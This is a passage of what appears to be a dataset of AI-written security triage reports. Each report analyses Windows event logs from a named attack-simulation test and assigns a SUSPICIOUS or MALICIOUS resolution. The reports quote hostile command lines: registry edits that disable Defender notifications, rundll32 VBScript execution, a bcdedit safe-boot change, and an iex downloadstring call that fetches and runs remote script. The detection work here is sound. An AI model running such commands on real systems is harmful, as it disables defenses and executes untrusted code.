Overall, the logs do not conclusively indicate malicious activity. The behavior noted is unusual, but without context, such as legitimate admin activities or a script performing system checks, it remains ambiguous.

**Resolution: SUSPICIOUS**

**Guidance:**
- Conduct further investigation into the origin and context of the command-line usage involving `pcalua.exe`.
- Consider checking the user account `SERVER002\\admin_test` to see if it correlates with legitimate privileges and actions.
- Ensure audit configurations are complete and capturing all necessary details in Security and PowerShell logs for future investigation capability."
Disable Win Defender Notification,"Upon closely examining the provided event logs, I identified several key points of interest and potential indicators of malicious activity. Here is a detailed analysis:

1. **Time Anomalies:**
   - The Windows Security log entries with EventID 4616 indicate a time change on the system. The `PreviousTime` is set after the `NewTime`, which suggests the system clock was set back. This is a notable security event because attackers might manipulate system time to bypass time-based security protocols or to mask their activities.

2. **Registry Modification:**
   - There's a Sysmon event indicating the execution of `cmd.exe` to modify a registry key related to `Windows Defender Security Center` notifications. The command `reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications"" /v ""DisableNotifications"" /t REG_DWORD /d 1 /f` is potentially malicious, as it attempts to disable security notifications.
   - The user `SERVER002\admin_test` was involved in executing this command. Registry changes like this are often used by attackers to reduce visibility of their actions or to disable security features, thus this activity is highly suspicious.

3. **Process Execution:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` were executed by user `SERVER002\admin_test`. While these utilities can be used for legitimate administrative purposes, their execution in rapid succession by a non-system user warrants scrutiny, especially in conjunction with the other findings.

4. **Use of System Utilities:**
   - The execution of `whoami.exe` and `hostname.exe` by `SERVER002\admin_test` might suggest reconnaissance activities. Attackers often use these commands to gather information about their access level and network context.
   - The initiation of these utilities from high integrity levels indicates they were likely executed with elevated privileges, which is a typical characteristic in lateral movement or privilege escalation attempts.

5. **Software Update and Edge Activities:**
   - There are multiple logs related to `MicrosoftEdgeUpdate.exe` activities. While such updates are typically benign, the presence of these processes should be correlated with authorized software update schedules to ensure they are legitimate and not part of a malicious payload.

**Assessment and Conclusion:**

Based on the analysis of the logs, the key activities that stand out are the suspicious registry modification command and the system time manipulation. These activities align with tactics often used by attackers to evade detection and disable security measures. Given the potential implications of these actions, I conclude the situation as:

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
1. **Further Investigation:** Conduct a thorough investigation into user `SERVER002\admin_test`, focusing on the origin and legitimacy of their actions.
2. **System Integrity Check:** Examine if there have been any unauthorized changes to the system configurations or missing/logged files.
3. **Validate Time Changes:** Review the chain of events leading to the time change and verify if any legitimate administrative task or approved change triggered this.
4. **Security Measures:** Reinforce security measures, including the re-enablement of Windows Defender notifications and ensuring system-wide monitoring for further suspicious activities.
5. **Incident Response:** If further evidence supports a breach, initiate the incident response plan and consider isolating the affected system to prevent further damage.

By addressing these points, the organization can mitigate potential risks and enhance its overall security posture."
Javascript in registry,"Upon reviewing the provided logs, there are several key observations and suspicious activities that require attention:

### Suspicious Findings:

1. **PowerShell Activity:**
   - There are multiple PowerShell events that show the execution of a command, likely with encoded content, modifying the Windows Registry. The relevant command is:
     ```
     powershell.exe & {New-ItemProperty ""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"" -Name data -Value ""<script>""}
     ```
   - This behavior of using PowerShell to modify Internet settings with what appears to be script-related content is highly suspicious. Typically, this can be indicative of an effort to execute malicious scripts or alter browser/network settings for malicious intentions.

2. **Unexpected Time Change:**
   - There are events showing a backward adjustment of the system time (`EventID 4609` in the Security log). Manipulating system time might be an attempt to evade time-based defenses or logs.
   - The process responsible is `svchost.exe`, which is a legitimate Windows process, but given no other system maintenance justification, it might be used in an unauthorized manner in this context.

3. **Regular Sysmon Logging:**
   - There are numerous events involving processes like `wevtutil.exe`, and `conhost.exe`, initiated under the user `admin_test`. They seem to involve command-line activities, potentially representing interactions with event logs (`wevtutil.exe` is a command-line utility for managing logs).
   - While these actions are not inherently malicious, combined with other factors, they might suggest an attempt to cover tracks or export logs.

4. **Logging and Privilege Observations:**
   - Multiple entries for `4672` and `4624` indicate special privileges assignments to `admin_test`, which might indicate potential privilege escalation or an attempt to gather more information from an already privileged account.
   - Use of `SeDebugPrivilege`, `SeSecurityPrivilege`, and other high-level privileges in this context without a known maintenance window is suspicious.

5. **Edge Updates:**
   - Whilst Microsoft Edge and its update processes (`MicrosoftEdgeUpdate.exe`) appear frequently and with operations typical for legitimate updates, cross-referencing these with non-office hours or unexpected update schedules might provide more clarity if they were indeed benign or possibly exploited.

### Assessment:

Based on the evidence from the logs, there are indicators of potentially unauthorized or malicious activity. The activities, particularly the registry modification through PowerShell and the timing manipulations, suggest attempts at exploiting the system, although more validation is necessary to determine the full scope and intent.

### Resolution: SUSPICIOUS

Given the existing evidence, I recommend classifying this situation as **SUSPICIOUS**. Further investigation is required to:
- Validate the legitimacy of the PowerShell operations and the intentions/methodology behind the system time change.
- Cross-verify user activity logs, corresponding timestamps, and any network activity associated with `admin_test` or external entities during the noted timeframe.
- Perform threat hunting measures based on registry entry changes and other known IOCs (Indicators of Compromise).
- Ensure all relevant patches are applied, particularly for any known PowerShell or Windows Shell vulnerabilities.

### Next Steps:
- Conduct an in-depth forensic analysis on the potentially compromised host to uncover malicious payloads or unauthorized access vectors.
- Engage with IT to monitor for repeated suspicious patterns or additional related activities.
- Potentially isolate the system if further suspicious actions continue to manifest or are detected."
Rundll32 execute VBscript command using Ordinal number,"Upon reviewing the provided logs, several activities have been observed that warrant closer examination:

1. **Microsoft Edge Update Activity**: There is frequent and repetitive execution of processes related to MicrosoftEdgeUpdate, indicating software update operations for Microsoft Edge. The presence of numerous events for executable files like `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`, and various setup executables in the EdgeUpdate directory suggest routine update operations. These processes are executed by the `NT AUTHORITY\SYSTEM`, aligning with expected behavior of system-updated software installations.

2. **Execution of `cmd.exe` with a Suspicious Command Line**: Notably, an event shows `cmd.exe` being executed with the following command line:
   ```
   ""cmd.exe"" /c rundll32 vbscript:""\\..\\mshtml,#135 ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)
   ```
   This command indicates an attempt at executing a script using `rundll32` to spawn `calc.exe` from a VBS inline script. Usage of `rundll32` in this manner is a known technique used in malicious activities. It appears that this process was executed by the `SERVER002\admin_test` user with a high integrity level, raising concerns of a potential security compromise.

3. **Abnormal Usage of `whoami.exe` and `conhost.exe`**: Several instances of `whoami.exe` and `conhost.exe` are present. While `whoami.exe` serves diagnostic purposes, its repeated execution might suggest reconnaissance activities if it deviates from typical usage patterns.

4. **Privilege Escalation Indicators**: The Security logs show multiple logons of the `admin_test` user with elevated privileges, and a command attempted to invoke `SeDebugPrivilege` among other sensitive privileges, which might suggest unauthorized privilege escalation.

5. **Time Anomalies**: There is consistent logging where the `NewTime` precedes the `OldTime`. Such discrepancies, while sometimes appearing due to legitimate synchronization issues, may need thorough investigation as they are sometimes exploited in timestamp manipulation by malicious actors.

### Assessment:

- **Suspicious Activity**: The execution of the `cmd.exe` command with `rundll32` to run a VBScript is highly suspicious and usually indicative of malware-like activity or a potential foothold by an attacker. It necessitates immediate investigation due to the known tactic of using `rundll32` for malicious purposes.

- **Operating System and Edge Updates**: A majority of the repeated activity pertains to Microsoft Edge updates and other legitimate system processes which align with expected system maintenance and software update behavior, such as `svchost.exe`, `TrustedInstaller.exe`, and Edge setup files. These activities do not warrant concern but should be continuously monitored.

### Recommended Resolution:

**SUSPICIOUS** – The detected command execution involving `cmd.exe`, `rundll32`, and VBScript requires thorough investigation. It's essential to verify the legitimacy of this command, ensure the security of the `admin_test` user account, and determine if any unauthorized changes or malware installations have been conducted. Actions such as containing any potentially compromised accounts, increasing monitoring, and analyzing further potential suspicious behaviors should be prioritized. Additionally, a comprehensive system integrity check might be needed to rule out further unauthorized access or tampering."
Invoke HTML Application - Jscript Engine Simulating Double Click,"### Detailed Analysis of the Logs:

#### 1. Process and Command Line Execution:
- **PowerShell Execution:** The log entries indicate the use of PowerShell with the command line: `powershell.exe & {Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick}`. This command is highly suspicious as it indicates the use of an HTA (HTML Application) file which can be leveraged for running scripts and potentially malicious activities using the JScript engine for execution.
  
- **UsoClient Execution:** The entry for `UsoClient.exe` with `CommandLine=""C:\Windows\System32\usoclient.exe StartStoreUpdates""` executed by `NT AUTHORITY\SYSTEM` appears to be benign as it is typical for initiating Windows Update checks.
  
- **Conhost.exe:** Multiple instances of `conhost.exe` are observed, which is spawned as a typical behavior for hosting console processes. However, frequent creation along with PowerShell execution may indicate potential command-line activity being cloaked.

- **wevtutil.exe Execution:** The presence of `wevtutil.exe` (Windows Events Command Line Utility) being executed is notable. It might be used to clear or create event logs, a behavior that can be associated with attackers attempting to cover their tracks.

#### 2. Unusual Parent-Child Process Relations:
- The parent of `PowerShell` and `wevtutil.exe` processes show `wsmprovhost.exe` as a parent process. `wsmprovhost.exe` is related to Windows Remote Management (WinRM) and can be normal but should be scrutinized for unexpected usage. This could imply remote script execution attempts.

#### 3. Windows Update and Other System Activities:
- Logs related to Windows Update activities (EventID: 44) appear typical for a system checking and installing updates. However, these do not correlate with the suspicious PowerShell activity and HTA execution.

#### 4. Application and System Logs:
- The application and system logs do not reveal any immediate malicious actions or errors. Windows system operations like updates and application verifications seem functioning as expected.

### Assessment of the Situation:
The recurring use of PowerShell with potentially malicious scripts (based on the command line invoking HTA) presents a significant indication of malicious activity. The concurrent execution of `wevtutil.exe` could infer attempts to tamper or erase logs. The combination of these findings suggests an attempt to leverage system utilities for possibly malicious purposes.

### Final Resolution:
- **MALICIOUS** - The activities of running potentially malicious PowerShell commands involving HTA and JScript, combined with suspicious event log manipulation tools like `wevtutil.exe` being used excessively, indicate malicious activity.

### Guidance on How to Proceed:
1. **Containment and Eradication:**
   - Isolate the host from the network to prevent further potential malicious activity.
   - Restart the system in safe mode and scan for malicious scripts and other remnants.
   - Review and terminate any suspicious processes still active.

2. **Forensic Analysis:**
   - Perform a deeper analysis on PowerShell histories, logs, and any HTA/JScript artifacts potentially executed.
   - Investigate network activity, especially related to WinRM, to detect unauthorized access or remote code execution.

3. **Review Audit Logs:**
   - Analyze the logs for privilege escalation, file modifications, or any lateral movement attempts.

4. **System Restoration and Patching:**
   - Restore the system from a known clean backup if necessary and ensure all OS and applications are up to date with latest security patches.

5. **Strengthen Security Posture:**
   - Implement stricter application whitelist and PowerShell execution policies.
   - Enhance monitoring for anomalous use of administrative tools and PowerShell activities.

Immediate action is required to mitigate any potential breach and harden the environment against further threats."
Activate Windows NoClose Group Policy Feature,"Analyzing the provided Windows event logs, several entries indicate unusual behavior which may require further investigation. Below are the detailed findings:

### Security Logs:
- **EventID 4616** appears to involve time adjustment actions by `svchost.exe`, initiated by the `LOCAL SERVICE` account, which is commonly seen in system maintenance tasks such as time synchronization. However, if these adjustments are frequent and not aligned with scheduled time updates, it could be suspicious.

### Application Logs:
- Logs related to `edgeupdate` show that a service was stopped. This is usually benign as part of normal update procedures, but it could be suspicious if there is a history of unauthorized service stops or starts without a known update process.

### Sysmon Logs:
- **Sysmon EventID 1 and 5** show numerous executions of `cmd.exe`, `reg.exe`, `whoami.exe`, and `wevtutil.exe` by `SERVER002\admin_test`. The sequence involving `cmd.exe` executing a registry modification (`reg add`) is particularly notable. The command line used adds a registry value which disables the shutdown option from the Start Menu. This could be indicative of malicious intent to prevent system shutdown or restart, common in persistence techniques used by malware.
- The use of `wevtutil.exe` and `whoami.exe` could be part of a legitimate administrative activity. However, these could also be used in reconnaissance or event log clearing by an attacker. The user `SERVER002\admin_test` needs verification to determine if it matches legitimate administrative activity.
- **Edge Update Activities**: Multiple executions of Microsoft Edge Update processes appear legitimate, reflecting standard software update activities. These include running as `NT AUTHORITY\SYSTEM`, which is typical for system-integrity processes.

### System Logs:
- The **Kernel-General EventID 1 and 24** show regular time bias adjustments and updates to time zone information. This is ordinarily benign, reflecting system time synchronization processes.

### Assessment:
- The registry modification command is highly suspicious, as it alters system behavior in a way that is frequently used by malware to establish persistence.
- The sequence of `cmd.exe` and registry modification combined with execution by a non-system user account prompts a risk of unauthorized changes.

### Resolution:
Given the suspicious registry modification command and considering the context of potential system or user account abuse, the logs indicate suspicious behavior deserving further investigation.

**Resolution: SUSPICIOUS**

### Recommendations:
1. **Further Investigation**: Examine the user account `SERVER002\admin_test` for signs of compromise or unauthorized access.
2. **Review Registry**: Check for unauthorized changes in registry settings, particularly those that affect system shutdown.
3. **Log Review**: Investigate past logs for similar patterns of behavior or processes run by unexpected users.
4. **System Integrity**: Monitor the system for signs of unauthorized software or further registry changes.
5. **User Education**: Ensure users are aware of secure credential practices and potential phishing attempts."
Regsvr32 local COM scriptlet execution,"Upon analysis of the provided Sysmon, Application, Windows PowerShell, System, and Security logs, the following observations can be made:

### Sysmon Log Analysis

1. **Frequent use of `wevtutil.exe` and `conhost.exe`**: These events show the same user ""SERVER002\admin_test"" initiating several processes of `wevtutil.exe` and `conhost.exe`. `wevtutil.exe` is a legitimate Windows utility for managing event logs, but its usage outside of scheduled administrative tasks can indicate malicious activity.

2. **Suspicious use of `regsvr32.exe`**: Event ID 17992 displays the execution of `regsvr32.exe` with command-line arguments to unregister (`/u`) and load a script file (`/i:""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.010\src\RegSvr32.sct""`), which is a known technique for loading malicious scripts bypassing detection. This is highly indicative of potentially malicious activity.

3. **CMD shell execution with suspicious command-line arguments**: The event with `cmd.exe` shows suspicious use (Event ID 17990) executing `regsvr32.exe`. Often, command shells running such commands aim to execute a specific payload discreetly.

4. **Common pattern of Microsoft Edge Update**: There are multiple events indicating activity related to `MicrosoftEdgeUpdate.exe`. Such activities are relatively normal; however, in combination with potentially malicious activities, it might be necessary to verify to ensure it is not being obscured as a part of the attack.

### Application Log Analysis

- Regular updates and service operations such as stopping services related to `edgeupdate` are observed. These are typically benign, but in a compromised system could be used as a cover for threat actor activities.

### Conclusion

Given these observations, the current findings indicate a strong possibility of malicious activity due to the suspiciously crafted command within `cmd.exe` and the usage of `regsvr32.exe`. Particularly, the combination of these logs indicates potential exploitation techniques involving scriptlets, often used for fileless malware attacks.

### Resolution: MALICIOUS

**Recommendation:**
1. **Immediate Isolation**: Isolate the host `Server002` from the network to prevent any lateral movement by the threat actor.
2. **Deep Dive Analysis**: Conduct a deep-dive forensic analysis on the machine. Pull disk images and memory snapshots for detailed investigation.
3. **Examine Network Logs**: Investigate correlated network logs for unusual outbound communications or connections to suspicious domains or IP addresses related to malicious activity.
4. **Review Permissions and Access**: Check access permissions and user account activities, especially for accounts like `admin_test`.
5. **Patch and Update**: Ensure that all systems, including `Microsoft Edge`, are patched and up to date to avert exploitation of any vulnerabilities by similar malicious scripts. 
6. **Cross-reference Threat Intel Sources**: Check the triggered indicators against known databases of threat intel for potential matches on recognized attack vectors or actors."
Command Execution with NirCmd,"Upon reviewing the logs across the given channels (Security, Windows PowerShell, Sysmon, Application, and System), several events stand out, particularly due to unusual process executions and the appearance of potential malicious activity. Here’s the detailed analysis:

### Analysis:

#### Security Log:
- **EventID 4624**: Reflects a successful logon event. The logon type is 5, which is associated with a service startup. This itself is not suspicious.
- **EventID 4672**: Indicates special privileges assigned, such as SeDebugPrivilege. This could be normal for system processes, but it is worth noting in a suspicious context. 
- **EventID 4798**: Query for a user or group membership, which does not usually indicate suspicious activity unless part of a larger pattern.

#### Windows PowerShell Log:
- PowerShell is invoked using the command to execute a file named `nircmd.exe` to hide system tray windows, which is inherently suspicious behavior.
- The path to `nircmd.exe` includes an attempt to traverse directories (`..\Externalfiles`), which might indicate a manipulation using files not typically present in legitimate operations.

#### Sysmon Log:
- Numerous executions of processes, mainly under a specific user `admin_test`, were observed:
  - PowerShell and CMD executions with unusual parameters, particularly invoking `nircmd.exe` suspiciously as mentioned above.
  - Multiple instances of `CONHOST.EXE` and `wevtutil.exe` indicate potential activity to manipulate/conceal event logs.
  - Invocations involving system binaries such as `whoami.exe` to gather information about the environment, and `cmd.exe` to execute commands implying the use of automated scripts or scheduled tasks to perform operations covertly.

### Contextual Observations:
- **NirCmd Usage**: This tool is a legitimate command-line utility capable of performing various small system adjustments, such as muting sound or opening the CD-ROM, without an interface. Its usage to hide windows is suspicious, as it could be employed for clandestine activities.
  
### Assessment:
The combination of PowerShell and Sysmon events highlights potential indicators of compromise, characterized by:
- Unusual PowerShell script execution.
- The use of `nircmd.exe` for potentially unauthorized modifications of system UI elements.
- Multiple low-level system interactions that could imply privilege execution or reconnaissance activities.

### Conclusion:
**Resolution**: **SUSPICIOUS**

Based on the logs, certain activities raise concerns due to their nature and operation methods, especially regarding unauthorized visibility alterations. While not conclusively malicious without additional context (like network logs, or DNS queries), these activities are suspicious and merit a deeper investigation. Focus should be given to confirming the authenticity and purpose of `nircmd.exe` execution and potential scripts associated with PowerShell activities.

### Recommendations:
- Investigate the intent and source of the PowerShell script.
- Verify the legitimacy and necessity of `nircmd.exe` on the system.
- Monitor for repetitive or subsequent activities involving `admin_test` or SYSTEM context users.
- Conduct a thorough endpoint scanning and review of scheduled tasks to ferret out any unauthorized scripts or tasks.
- Check network communication logs for any unexpected outbound connections correlating with the times of these activities."
DiskShadow Command Execution,"Upon analyzing the provided Sysmon and PowerShell logs, I have identified some potentially suspicious activity:

1. **PowerShell Usage with Diskshadow**:
   - There are several entries in the Sysmon logs indicating the execution of `powershell.exe` with a command line that involves `diskshadow.exe`, which is a utility for shadow copy management and volume shadow copy service.
   - The command line is: `""powershell.exe"" & {C:\Windows\System32\diskshadow.exe -S C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\data.txt}`. Using Diskshadow via PowerShell, especially from a temp location, can sometimes be indicative of malicious activities like data exfiltration or preparation for unauthorized backup and restoring activities.

2. **Unusual Process Execution and Chain**:
   - Processes such as `powershell.exe`, `wevtutil.exe`, and `conhost.exe` were executed by the same user `SERVER002\\admin_test`. While these can be legitimate activities, their rapid succession, especially involving wevtutil (a command-line utility for managing event logs), could suggest someone is tampering with logs or performing other administrative tasks that could be malicious if conducted without proper authorization.

3. **High Integrity Level with the processes**:
   - Multiple processes like `whoami.exe`, `HOSTNAME.EXE`, and others were running at a high integrity level, which provides them significant privileges. This could be typical for administration purposes, but if unexpected, it should be vetted.

4. **Edge Update Processes**:
   - There are entries indicating updates related to Microsoft Edge, this seems part of routine update management. However, the presence of these processes alongside the suspicious PowerShell activity raises questions about whether this activity is as benign as typical updates.

The logs highlight the use of potentially administrative tools and techniques (e.g., PowerShell, Diskshadow), and the processes with elevated privileges in quick succession without clear context or expected user action patterns could be a cause for concern.

### Assessment:
- **Resolution: SUSPICIOUS** – The activity, especially the usage of `diskshadow.exe` within PowerShell scripts and the associated command lines, is atypical for normal user activity and warrants further investigation. There are no clear indicators that the activity is overtly malicious, but it is potentially suspicious due to the rapid and combined usage of high privilege commands and tools.

### Recommended Actions:
1. **Investigate Commands**: Verify whether such PowerShell and Diskshadow combinations are part of authorized activities by the user `SERVER002\\admin_test`.
2. **Logs Analysis**: Conduct deeper analysis into event logs to identify whether similar activities were executed at other times or if they have legitimate associated tasks or ticketing.
3. **User Validation**: Verify with the administrative staff or server owner whether `admin_test` account activities were known and approved.
4. **Network Traffic Analysis**: Check for any unusual network activity from this system to ensure no data exfiltration was attempted.
5. **Endpoint Monitoring**: Increase monitoring on SERVER002 to capture any follow-on activities that might confirm or dispel malicious intent.

By doing so, we can ascertain the legitimacy of these activities or uncover any hidden malicious activity."
Rundll32 advpack.dll Execution,"The provided log entries were analyzed for any indicators of compromise or suspicious activity. Here's a detailed analysis:

### **Key Observations:**
1. **Process Executions**:
   - **PowerShell Execution**: There were multiple `powershell.exe` events but without specific command lines to determine suspicious activity.
   - **Conhost and Wevtutil**: These processes are typically associated with console applications and Windows Event Log Management, respectively. The execution pattern here is normal and expected.
   - **Cmd and Rundll32**: The execution of `cmd.exe` with a command involving `rundll32.exe` suggests potential execution of a script or non-standard operations. The use of `advpack.dll,LaunchINFSection` might indicate an attempt to leverage INF scripts. This warrants suspicion, especially if found executing from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.011\\src\\data.011.inf`).

2. **Security Events**:
   - **Security Log**: The primary logon event (ID: 4624) and the privileges assigned (ID: 4672) are typical for system processes running under elevated permissions. No overtly suspicious privilege escalation events were noted here.
  
3. **Microsoft Edge Update**:
   - Multiple entries regarding Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) executing various tasks, including updates and registrations. The presence of these entries is consistent with normal update activities but requires validation to ensure these sessions are legitimate.
   
4. **Application Events**:
   - Windows Defender status indicates it is active (SECURITY_PRODUCT_STATE_ON), which suggests that real-time protection should have been operational during these events.

### **Assessment**:
- **Suspicious Activity**: The execution of `cmd.exe` with `rundll32.exe` pointing to a potentially unauthorized INF installer section in a temporary directory is the most suspicious activity observed. This behavior could be indicative of an attempted malicious operation or configuration change.
- **Other Activities**: Most of the other process executions and application logs appear routine, involving Windows servicing and application updates (e.g., Edge Update). The system logins and processes executed under `NT AUTHORITY\SYSTEM` show expected operating system behavior patterns.

### **Resolution**:
- **SUSPICIOUS**: The activity highlighted, particularly involving `rundll32.exe` in conjunction with command lines targeting temporary directories, warrants further investigation. Although this could be part of a legitimate operation, it matches patterns seen in malicious activities such as malware execution or persistence via script execution.

### **Guidance on How to Proceed**:
1. **Investigate Further**: Conduct a deeper investigation into the specific environment where these logs originated. Verify if there was any authorized task requiring the use of `rundll32.exe` from a temporary directory.
2. **Check File Integrity**: If possible, obtain a copy of `data.011.inf` and any scripts to analyze their content and purpose.
3. **Conduct Endpoint Security Assessment**: Validate that no unauthorized modifications or malware are present on the system. Use additional endpoint protection tools to scan for known threats.
4. **Review User Activity and Permissions**: Verify the permissions and activities of the `SERVER002\admin_test` user account to confirm legitimacy and ensure it hasn’t been compromised.
5. **Monitoring**: Increase monitoring on the processes and directories indicated, particularly any pertinent to the suspicious command line and PowerShell executions.

By following these actions, you will reduce the risk of missing potential malicious activities while confirming the legitimacy of authorized activities."
Safe Mode Boot,"After reviewing the Windows event logs provided, here is the detailed analysis of the activity observed:

1. **Sysmon Logs**:
   - The logs show multiple executions of `wevtutil.exe`, `conhost.exe`, and `svchost.exe`, which are all legitimate Windows processes. The pattern of execution appears repetitive: each instance of `wevtutil.exe` being immediately followed by `conhost.exe` under the same user (`SERVER002\\admin_test`). This pattern repeats several times in quick succession.
   - The execution of `hostname.exe`, `whoami.exe`, and `cmd.exe` is also observed. These utilities are typically used for querying system information or conducting administrative tasks.
   - A particularly suspicious command is observed in the execution of `cmd.exe`: `""cmd.exe"" /c bcdedit /set safeboot network`. This command is used to set the system to boot in safe mode with networking, which can potentially be used by an attacker to perform malicious tasks in a more controlled environment.

2. **System Logs**:
   - Time synchronization events (Kernel-General, Time-Service) are typical and not inherently suspicious. These logs indicate regular system time adjustments with no evidence of tampering.

3. **Security Logs**:
   - The logs indicate time change events. This is consistent with the System logs and suggests legitimate time synchronization activities.

4. **PowerShell and Application Logs**:
   - No relevant entries were provided for analysis.

**Assessment**:
- The execution of `bcdedit` command via `cmd.exe` to set the system to boot in safe mode with networking is anomalous and particularly concerning. This change can alter the boot configuration and is often affiliated with either troubleshooting by administrators or potentially malicious activity where an attacker seeks to load fewer services and drivers for stealth.
- The repetitive and quick succession of process executions involving system utilities, particularly `wevtutil.exe` and `conhost.exe`, could be normal system activity depending on context, but they often might necessitate a deeper look to ensure these aren't used for log clearing activities or other obfuscation tactics.

**Threat Level**:
- This needs to be classified as **SUSPICIOUS** due to the `cmd.exe` invocation with `bcdedit` to modify boot settings and the unusual repetition of system utility executions.
  
**Guidance**:
1. Investigate the justification of the `bcdedit` usage. Verify whether this was part of legitimate troubleshooting or patch management processes.
2. Examine the user activities of `SERVER002\\admin_test` around this timeframe to understand the context or intent of these operations.
3. Check for any concurrent network activity or external communications that might correlate with the execution patterns observed.
4. As a precaution, confirm that no unauthorized changes have been made to system boot configurations, and monitor for any signs of lateral movement or further commands adjusting system settings.

Once these actions have been performed and more context is gathered, the classification can be reassessed and adjusted if necessary."
InstallUtil Uninstall method call - -U variant,"### Detailed Analysis

Upon reviewing the provided Windows event logs, there are several points of concern related to PowerShell and Sysmon log events. These logs collectively suggest activities that could be considered suspicious or indicative of potential compromise.

#### Observations:

1. **PowerShell Log Events**:
   - The PowerShell logs indicate the execution of a script named `InstallUtilTestHarness.ps1` located in the `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\src\` directory.
   - The script appears to be testing the execution of a .NET assembly (`data.004.dll`) using the `InstallUtil.exe` utility, a legitimate Microsoft component that can be misused for executing arbitrary code.
   - It includes an error-handling segment that throws an exception if `InstallUtil` does not execute as expected: 

     ```plaintext
     if ($ActualOutput -ne $ExpectedOutput) {
         throw @""
         InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.
     Expected: $ExpectedOutput
     Actual: $ActualOutput
     ""@
     }
     ```
     
   - The environment involved is an administrative context (`SERVER002\\admin_test`), which may provide higher privileges if malicious activity is intended.

2. **Sysmon Log Events**:
   - Multiple Sysmon events show instances of `InstallUtil.exe` invoking `data.004.dll`, which aligns with the suspicious PowerShell activities.
   - Processes such as `csc.exe` (C# Compiler) and `cvtres.exe` (COFF Object Converter) are executed, suggesting dynamic code compilation, a tactic often used to complicate the detection of malicious scripts.
   - The execution of `wevtutil.exe` and `conhost.exe` multiple times, along with the running of `powershell.exe` from temporary directories, may also indicate suspicious behavior, as attackers often leverage these utilities to log events for unauthorized purposes or to obfuscate activities.
   - The high integrity level of these processes confirms an elevated privilege, which is commonly necessary for performing system-level changes or attacks.
   
#### Assessment:
- The observed activity surrounding the PowerShell script and the use of `InstallUtil.exe` to execute a potentially malicious `.NET` assembly is atypical and could be aligned with known attack vectors, such as installing or executing arbitrary payloads.
- The presence of dynamic code execution through `csc.exe` and `cvtres.exe` is particularly concerning because it indicates potential attempts to create executable code on-the-fly, often a hallmark of malware.
- The administrative user context and high integrity levels further elevate the risk, as they could allow an attacker to gain extensive control over the system if this is indeed malicious.

#### Conclusion:

Given the combination of the above factors and the potential for malicious intent in executing code dynamically and with elevated privileges, the logs can be designated as:

- **SUSPICIOUS:** These activities warrant further investigation to ascertain whether the behavior stems from legitimate testing activity, potentially authorized internal tools, or an external compromise.

#### Guidance on How to Proceed:
1. **Immediate Steps**:
   - Isolate the host (Server002) to prevent any potential lateral movement.
   - Perform a detailed review of the `InstallUtilTestHarness.ps1` script and the `data.004.dll` file to understand their functionality and origin.
   - Investigate the context and origin of any commands run from temporary directories, as these can often host transient malware artifacts.

2. **Long-term Actions**:
   - Enhancing monitoring for unusual process creations and PowerShell script executions, especially those involving `InstallUtil.exe` or residing in non-standard paths like temp directories.
   - Educate administrative users on recognizing suspicious activities and reduce unnecessary administrative rights to minimize the risk surface.

It is crucial to determine the legitimacy of these activities to either rule out or confirm a malicious compromise."
Ursnif Malware Registry Key Creation,"Based on a detailed analysis of the provided Windows event logs, here is a summary and assessment:

1. **System Log Analysis**:
   - Several events are logged around time adjustments, indicating synchronization or updates with a time server. This is generally normal behavior for system time synchronization and does not appear immediately suspicious on its own.
   - The use of `svchost.exe` for these events is typical, as it is a known part of legitimate system operations.

2. **Sysmon Log Analysis**:
   - The logs reveal the execution of several processes including `wevtutil.exe`, `conhost.exe`, and `hostname.exe` by a user account `SERVER002\\admin_test`. The presence of `wevtutil.exe`, a utility for managing event logs, is common in both administrative tasks and some malicious activities. However, the `hostname.exe` and `conhost.exe`, shown with normal attributes, seem benign.
   - A potentially concerning event is the creation of a registry entry using `cmd.exe` and `reg.exe`, with an unusual subkey and value. The command `reg add HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY /d 72656463616e617279 /f` suggests a configuration change in the user's context. This could be indicative of either system administration or malicious concealment activity, depending on the broader context.

3. **Security Log Analysis**:
   - Events show time changes, reflecting the activity observed in the system logs, which supports the conclusion of system-level time synchronization rather than malicious manipulation.

4. **Application and PowerShell Logs**:
   - The Application log entry linked to `Software Protection Platform Service` doesn't indicate suspicious activity directly, as it's typical for license verification or similar processes.

**Assessment**:
- **BENIGN/SUSPICIOUS Elements**:
  - Time synchronization events are benign.
  - Execution of tools such as `hostname.exe` and `wevtutil.exe` can be legitimate, but their use in specific contexts, especially alongside registry modifications, can also be suspicious.
  - Registry modification through command line tools (`cmd.exe` and `reg.exe`), particularly in a user-specific registry path, raises suspicion absent further context.

**Final Resolution: SUSPICIOUS**
- The execution of specific utilities and the registry modification command requires further examination to determine if these activities are being carried out as part of an administrative routine or potentially malicious intentions. It is recommended to:
  - Investigate the `SERVER002\\admin_test` user’s actions and intentions.
  - Review whether the registry modification activity aligns with known administrative tasks or policies.
  - Cross-reference these events with any threat intelligence data or alerts to identify potential matches with known attack patterns or indicators of compromise."
WinPwn - UAC Bypass ccmstp technique,"Based on the provided logs, I've conducted a detailed analysis to determine if there is any malicious activity. Here's the breakdown:

### PowerShell Log:
- Multiple instances show PowerShell executing a script via a URL:
  - `HostApplication` is running `powershell.exe` with command line arguments to execute a script from `https://raw.githubusercontent.com/script`.
  - The script seems to include `iex(new-object net.webclient).downloadstring(...)`, which indicates remote script execution.
  - The command line also includes launching `calc.exe` using a non-standard technique `ccmstp`.

### System and Security Logs:
- There are time change events but nothing inherently malicious.
- No direct evidence from these logs indicating compromise, but the PowerShell activity is unusual.

### Application Log:
- Windows Defender is active as indicated by `SECURITY_PRODUCT_STATE_ON`.
- Normal Windows and application activities are logged, such as Edge updates, without indication of compromise.

### Sysmon Log:
- Multiple events involving `powershell.exe` match the PowerShell log, reinforcing the evidence of script execution.
- The `Hashes` field could be used to further analyze integrity, although nothing else inherently malicious stands out here.

